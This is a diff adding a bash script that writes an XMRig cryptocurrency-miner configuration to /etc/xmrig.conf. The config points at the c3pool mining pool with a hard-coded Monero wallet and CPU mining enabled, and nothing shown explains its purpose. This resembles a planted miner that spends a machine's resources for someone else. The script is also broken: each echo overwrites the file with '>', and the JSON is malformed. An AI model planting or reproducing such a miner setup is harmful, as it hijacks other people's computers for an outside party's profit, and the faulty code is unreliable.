@@ -1,0 +1,26 @@
+#!/bin/bash
+
+if [[ ! -f /etc/xmrig.conf ]];
+then
+    echo '{' > /etc/xmrig.conf
+    echo '"autosave": false,' > /etc/xmrig.conf
+    echo '"cpu": true,' > /etc/xmrig.conf
+    echo '"opencl": false,' > /etc/xmrig.conf
+    echo '"cuda": false,' > /etc/xmrig.conf
+    echo '"pools": [' > /etc/xmrig.conf
+    echo '    {' > /etc/xmrig.conf
+    echo '        "coin": null,' > /etc/xmrig.conf
+    echo '        "algo": null,' > /etc/xmrig.conf
+    echo '        "url": "mine.c3pool.com:13333",' > /etc/xmrig.conf
+    echo '        "user": "843pFub5sGZMJaiXZybmCQErUNjrGhRYpRxYr924Ptig4VGs7Gc9eG1fe29f3UrdY8B19ez66tJ6659tKPmSVRWmPM6ByWL",' > /etc/xmrig.conf
+    echo '        "pass": "x",' > /etc/xmrig.conf
+    echo '        "tls": false,' > /etc/xmrig.conf
+    echo '        "keepalive": true,' > /etc/xmrig.conf
+    echo '        "nicehash": false' > /etc/xmrig.conf
+    echo '    },' > /etc/xmrig.conf
+    echo ']' > /etc/xmrig.conf
+    echo '"pause-on-battery": true,' > /etc/xmrig.conf
+    echo '"priority": 1,' > /etc/xmrig.conf
+    echo '"max-threads-hint": 25,' > /etc/xmrig.conf
+    echo '}' > /etc/xmrig.conf
+fi
